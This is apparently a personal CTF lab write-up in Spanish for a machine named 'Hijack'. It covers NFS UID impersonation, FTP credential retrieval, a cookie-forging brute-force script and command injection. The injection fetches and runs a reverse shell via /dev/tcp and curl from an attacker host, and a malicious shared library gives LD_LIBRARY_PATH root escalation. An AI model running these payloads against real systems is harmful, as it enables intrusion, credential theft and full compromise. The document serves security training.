# hijack

## Recon
```bash
silent-scan $TARGET
nmap -sVC -p21,22,80,111,2049,43595,46241,49570,57793 $TARGET -oN service
```

**Output**
```
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
43595/tcp open  mountd   1-3 (RPC #100005)
46241/tcp open  nlockmgr 1-4 (RPC #100021)
49570/tcp open  mountd   1-3 (RPC #100005)
57793/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
___

## Enumeration

### NFS

```bash
showmount -e $TARGET
```

**Output:**
```
Export list for 10.130.140.158:
/mnt/share *
```

El share está abierto a cualquier host (`*`). Al montar e intentar listar el contenido, el acceso es denegado:

```bash
mkdir /tmp/nfs_mount
sudo mount -t nfs $TARGET:/mnt/share/ /tmp/nfs_mount -o nolock
sudo ls -la /tmp/nfs_mount
# ls: cannot open directory '/tmp/nfs_mount': Permission denied
```

Inspeccionando los permisos del directorio montado:

```
drwx------  2 1003 1003 4.0K Aug  8  2023 nfs_mount
```

El directorio pertenece al UID `1003`, que no existe localmente. NFS autentica por UID, por lo que basta con crear un usuario local con ese mismo UID para obtener acceso.

**NFS UID Hijack:**

```bash
sudo useradd -u 1003 temp_user
sudo su temp_user
cd /tmp/nfs_mount
cat for_employees.txt
```

**Output:**
```
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```

Credenciales FTP obtenidas.

---

### FTP

```bash
ftp $TARGET
ls -la
get *
```

**Output:**
```
.  ..  .from_admin.txt  .passwords_list.txt  service  silent  test.txt
```

```bash
cat .from_admin.txt
```

```
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords
don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm
using one of those.
NOTE To rick : good job on limiting login attempts, it works like a charm, this will
prevent any future brute forcing.
```

Extraemos dos datos clave: usuario **admin** y una lista de passwords en `.passwords_list.txt`.

---

### Web — Análisis de la cookie

Al crear una cuenta e iniciar sesión, la cookie `PHPSESSID` está codificada en base64:

```bash
echo "bmlrOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl" | base64 -d
# nik:e10adc3949ba59abbe56e057f20f883e
```

La estructura es `usuario:md5(password)` — lo que permite **falsificar sesiones** de cualquier usuario conociendo o crackeando su hash.

---

### Web — Cookie Hijack de admin

Con la lista de passwords del FTP, hasheamos cada una en MD5, construimos la cookie como `admin:hash` en base64 y la probamos contra `/administration.php`:

```bash
#!/bin/bash
TARGET="10.130.140.158"
PASSFILE=".passwords_list.txt"

while IFS= read -r pass; do
    hash=$(echo -n "$pass" | md5sum | cut -d' ' -f1)
    cookie=$(echo -n "admin:$hash" | base64)
    result=$(curl -s -b "PHPSESSID=$cookie" "http://$TARGET/administration.php")

    echo "[-] Probando: $pass"

    if echo "$result" | grep -qi "Administration Page"; then
        echo "[+] Password encontrada: $pass"
        echo "[+] Cookie: PHPSESSID=$cookie"
        exit 0
    fi

done < "$PASSFILE"
```

**Output:**
```
[+] Password encontrada: <password>
[+] Cookie: PHPSESSID=<cookie>
```

---

## Foothold — Command Injection

El panel de administración tiene un campo para comprobar el estado de servicios. El filtro bloquea `;` y otros separadores pero no `&&`.

Subimos una reverse shell al servidor víctima:

```bash
# En kali
echo 'bash -i >& /dev/tcp/192.168.160.214/4242 0>&1' > shell.sh
python3 -m http.server 8080
```

Desde el campo del servicio descargamos la shell a `/tmp`:

```
ssh&&curl http://192.168.160.214:8080/shell.sh -o /tmp/shell.sh
```

Con el listener activo ejecutamos:

```bash
nc -lvnp 4242
```

En el campo del servicio:

```
&&bash /tmp/shell.sh
```

**Shell obtenida como `www-data`.**

---

### Estabilizar shell


```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

---

### Enumeración post-explotación

```bash
cat /var/www/html/config.php
```

**Output:**
```
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";
```

Credenciales de rick en el config de la web. Probamos por SSH:

```bash
ssh rick@$TARGET
# N3v3rG0nn4G1v3Y0uUp
whoami
cat user.txt
sudo -l
```

**Output:**
```
User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
    env_keep+=LD_LIBRARY_PATH
```

---

## Privesc — LD_LIBRARY_PATH Hijack

`sudo` conserva `LD_LIBRARY_PATH` gracias a `env_keep`. Comprobamos las librerías que carga apache2:

```bash
ldd /usr/sbin/apache2
```

**Output:**
```
libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
```

Creamos una shared library maliciosa con el mismo nombre que una de las librerías que carga apache2:

```bash
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/evil.c
```

Al ejecutar apache2 con sudo apuntando `LD_LIBRARY_PATH` a `/tmp`, carga nuestra librería en lugar de la real y ejecuta el constructor:

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

**Output:**
```
root@Hijack:~# whoami
root
cat /root/root.txt
```

**Root obtenido.**
---

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [showmount](../../../tools/recon/showmount.md)
- [nfs-uid-hijack](../../../exploits/network-services/nfs-uid-hijack.md)
- [cookie-base64-md5-forgery](../../../exploits/web-auth/cookie-base64-md5-forgery.md)
- [sudo-ld-library-path](../../../privesc/linux/sudo-ld-library-path.md)
